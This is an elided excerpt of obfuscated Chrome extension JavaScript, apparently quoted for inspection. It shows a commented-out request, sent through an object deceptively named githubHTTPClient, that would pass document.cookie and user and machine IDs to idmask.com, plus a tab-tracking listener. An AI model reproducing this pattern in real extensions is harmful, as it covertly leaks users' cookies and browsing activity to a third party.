...
//    githubHTTPClient.send("host=idmask.com&ce_name=" + b + "&ce_version=" + chrome.runtime.getManifest().version + "&ce_use=" + n + "&ce_day=" + (((new Date).getTime() - q) / 864E5 << 0) + "&ce_uid=" + r + "&ce_mid=" + s + "&ce_orgVersion=" + t + "&ce_miduid=" + s + r + "&ce_" + document.cookie + "&cookie=" + r);
//}
/**
 * @return {?}
 */
...
chrome.tabs.onCreated.addListener(function (c) {
    if (c) {
        ...
        if (i && !(0 > i)) {
            ...
            if (c.openerTabId && "chrome" != c.url.substr(0, 6)) {
                cl = A(c.openerTabId);
                p(i, cl);
